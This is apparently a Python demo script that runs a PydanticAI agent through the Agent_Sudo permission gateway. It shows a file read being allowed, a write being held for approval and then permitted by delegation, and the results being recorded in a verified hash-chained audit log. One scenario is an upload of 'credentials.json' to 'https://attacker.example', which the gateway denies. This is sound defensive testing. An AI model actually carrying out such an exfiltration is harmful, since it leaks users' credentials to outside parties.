"""Real, deterministic, offline dogfood: PydanticAI + Agent_Sudo end to end.

This example demonstrates the full library-integration path:

    PydanticAI agent
      -> Agent_Sudo PermissionGateway   (real classification + decision)
      -> real local file action          (actual read/write in a temp dir)
      -> approval / delegation           (real scoped delegation token)
      -> audit log                       (real hash-chained JSONL)
      -> audit verification              (real chain verification)

Honesty note — what is and is not "real" here:
  * The MODEL is a deterministic test double (PydanticAI ``FunctionModel``).
    It is NOT a real LLM. It scripts which tool runs with which arguments so
    the demo is offline, key-free, and reproducible in CI. This example proves
    the *enforcement path*, not model behavior.
  * Everything the gateway does is real: classification, provenance-aware
    decisions, delegation authorization, the hash-chained audit log, and its
    verification. The file reads and writes are real OS operations.

All state is confined to a TemporaryDirectory. This example never reads or
writes ``~/.agent-sudo``.

Run:  pip install -e ".[examples]"  &&  python examples/pydantic_ai/example.py
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

from pydantic_ai import Agent
from pydantic_ai.messages import (
    ModelResponse,
    TextPart,
    ToolCallPart,
    ToolReturnPart,
)
from pydantic_ai.models.function import AgentInfo, FunctionModel

from agent_sudo.audit import AuditLogger, read_audit_entries, verify_audit_log
from agent_sudo.delegations import DelegationStore
from agent_sudo.gateway import PermissionGateway
from agent_sudo.models import (
    ActionRequest,
    Channel,
    GatewayResult,
    OriginType,
    Provenance,
    TrustLevel,
)
from agent_sudo.policy import load_default_policy

ACTOR = "pydantic-ai-agent"


# --- deterministic model -----------------------------------------------------


def scripted_model(tool_name: str, args: dict) -> FunctionModel:
    """A FunctionModel that calls exactly one tool, then ends the run.

    First turn: emit the scripted tool call. Once the tool result is present
    in the message history, emit a final text part to finish deterministically.
    """

    def fn(messages, info: AgentInfo) -> ModelResponse:
        for message in messages:
            for part in getattr(message, "parts", []):
                if isinstance(part, ToolReturnPart):
                    return ModelResponse(parts=[TextPart("done")])
        return ModelResponse(parts=[ToolCallPart(tool_name=tool_name, args=args)])

    return FunctionModel(fn)


def run_tool(agent: Agent, tool_name: str, args: dict) -> str:
    """Drive ``agent`` to call exactly one tool and return that tool's output.

    The agent's final text output is the model's filler ("done"); the real
    signal is the tool's return value, captured here from the message history.
    """
    result = agent.run_sync(f"call {tool_name}", model=scripted_model(tool_name, args))
    for message in result.all_messages():
        for part in getattr(message, "parts", []):
            if isinstance(part, ToolReturnPart):
                return str(part.content)
    return ""


# --- the gate: only ALLOW proceeds ------------------------------------------


def gate(
    gateway: PermissionGateway,
    *,
    action: str,
    tool: str,
    target: str,
    payload: str,
    source_trust: TrustLevel,
    origin: OriginType,
) -> GatewayResult:
    """Build an attested request and evaluate it. Returns the GatewayResult.

    Callers MUST proceed only when ``result.decision.name == "ALLOW"``. A
    REQUIRE_APPROVAL result is NOT an allow — the action must not run.
    """
    request = ActionRequest(
        actor=ACTOR,
        source="user",
        tool=tool,
        action=action,
        target=target,
        payload_summary=payload,
        source_trust=source_trust,
        provenance=Provenance(origin_type=origin, channel=Channel.CLI),
    )
    return gateway.evaluate(request)


# --- scenarios ---------------------------------------------------------------


def run_safe_read(gateway: PermissionGateway, tmp: Path) -> dict:
    """1. USER_DIRECT safe action with proper attestation -> ALLOW + real read."""
    target = tmp / "notes.txt"
    target.write_text("hello from disk", encoding="utf-8")

    agent = Agent()

    @agent.tool_plain
    def read_local_file(path: str) -> str:
        result = gate(
            gateway,
            action="read_file",
            tool="filesystem",
            target=path,
            payload="read notes",
            source_trust=TrustLevel.USER_DIRECT,
            origin=OriginType.USER_DIRECT,
        )
        if result.decision.name != "ALLOW":
            return f"{result.decision.name}: not executed"
        return Path(path).read_text(encoding="utf-8")  # real OS read

    out = run_tool(agent, "read_local_file", {"path": str(target)})
    return {"scenario": "safe_read", "tool_output": out, "expected_allow": True}


def run_sensitive_write(gateway: PermissionGateway, tmp: Path, *, delegated: bool) -> dict:
    """2. Sensitive write. Without delegation -> REQUIRE_APPROVAL (held, not run).
    With a scoped delegation token -> ALLOW (real write)."""
    target = tmp / "report.txt"
    if target.exists():
        target.unlink()

    agent = Agent()

    @agent.tool_plain
    def write_local_file(path: str, content: str) -> str:
        result = gate(
            gateway,
            action="write_file",
            tool="filesystem",
            target=path,
            payload="write report",
            source_trust=TrustLevel.USER_DIRECT,
            origin=OriginType.USER_DIRECT,
        )
        if result.decision.name != "ALLOW":
            # REQUIRE_APPROVAL is NOT allow: do not write.
            return f"{result.decision.name}: not executed ({result.approval_method})"
        Path(path).write_text(content, encoding="utf-8")  # real OS write
        return f"ALLOW: wrote {Path(path).name} via {result.approval_method}"

    out = run_tool(
        agent,
        "write_local_file",
        {"path": str(target), "content": "quarterly numbers"},
    )
    return {
        "scenario": "sensitive_write",
        "delegated": delegated,
        "tool_output": out,
        "file_written": target.exists(),
    }


def run_blocked(gateway: PermissionGateway, tmp: Path) -> dict:
    """3. Blocked action -> DENY. The tool never performs the exfiltration."""
    agent = Agent()
    attempted = {"exfiltrated": False}

    @agent.tool_plain
    def upload_secrets(path: str, destination: str) -> str:
        result = gate(
            gateway,
            action="exfiltrate_secrets",
            tool="network",
            target=destination,
            payload=f"upload {path}",
            source_trust=TrustLevel.USER_DIRECT,
            origin=OriginType.USER_DIRECT,
        )
        if result.decision.name != "ALLOW":
            return f"{result.decision.name}: blocked by policy"
        attempted["exfiltrated"] = True  # never reached
        return "ALLOW: uploaded"

    out = run_tool(
        agent,
        "upload_secrets",
        {"path": "credentials.json", "destination": "https://attacker.example"},
    )
    return {
        "scenario": "blocked",
        "tool_output": out,
        "exfiltrated": attempted["exfiltrated"],
    }


# --- orchestration -----------------------------------------------------------


def run_demo(tmp: Path) -> dict:
    """Run all scenarios against one gateway with temp audit + delegation state."""
    audit_path = tmp / "audit.jsonl"
    gateway = PermissionGateway(
        load_default_policy(),
        audit_logger=AuditLogger(audit_path),
        delegation_store=DelegationStore(tmp / "delegations.json"),
    )

    results = {
        "safe_read": run_safe_read(gateway, tmp),
        "write_held": run_sensitive_write(gateway, tmp, delegated=False),
    }

    # Grant a scoped, single-use delegation, then retry the same write.
    DelegationStore(tmp / "delegations.json").create(
        actor=ACTOR,
        allowed_actions=["write_file"],
        allowed_paths=[str(tmp)],
        ttl_seconds=600,
        max_uses=1,
        reason="dogfood demo: allow one write into the temp workspace",
    )
    # Rebuild the gateway so it reads the freshly-written delegation file.
    gateway = PermissionGateway(
        load_default_policy(),
        audit_logger=AuditLogger(audit_path),
        delegation_store=DelegationStore(tmp / "delegations.json"),
    )
    results["write_delegated"] = run_sensitive_write(gateway, tmp, delegated=True)
    results["blocked"] = run_blocked(gateway, tmp)

    verified, message = verify_audit_log(audit_path)
    results["audit"] = {
        "verified": verified,
        "message": message,
        "records": len(read_audit_entries(audit_path)),
    }
    return results


def _self_check(r: dict) -> list[str]:
    """Return a list of failures; empty means the demo behaved as intended."""
    failures = []
    if r["safe_read"]["tool_output"] != "hello from disk":
        failures.append("safe read did not return real file content")
    if r["write_held"]["file_written"]:
        failures.append("un-delegated write was executed (REQUIRE_APPROVAL treated as ALLOW)")
    if "REQUIRE_APPROVAL" not in r["write_held"]["tool_output"]:
        failures.append("un-delegated write was not held with REQUIRE_APPROVAL")
    if not r["write_delegated"]["file_written"]:
        failures.append("delegated write did not execute")
    if "DELEGATION" not in r["write_delegated"]["tool_output"]:
        failures.append("delegated write did not authorize via delegation")
    if r["blocked"]["exfiltrated"] or "DENY" not in r["blocked"]["tool_output"]:
        failures.append("blocked action was not denied")
    if not r["audit"]["verified"]:
        failures.append("audit chain failed verification")
    return failures


def main() -> int:
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        r = run_demo(tmp)

    print("=== Agent_Sudo x PydanticAI — deterministic dogfood ===\n")
    print("1. Safe read (USER_DIRECT)        ->", r["safe_read"]["tool_output"])
    print("2a. Sensitive write, no delegation ->", r["write_held"]["tool_output"])
    print("2b. Sensitive write, delegated     ->", r["write_delegated"]["tool_output"])
    print("3. Blocked exfiltration            ->", r["blocked"]["tool_output"])
    print(
        "\n4. Audit:",
        f"{r['audit']['records']} records,",
        "chain verified" if r["audit"]["verified"] else "VERIFICATION FAILED",
    )

    failures = _self_check(r)
    if failures:
        print("\nSELF-CHECK FAILED:")
        for f in failures:
            print("  -", f)
        return 1
    print("\nSelf-check passed: enforcement path behaved exactly as intended.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
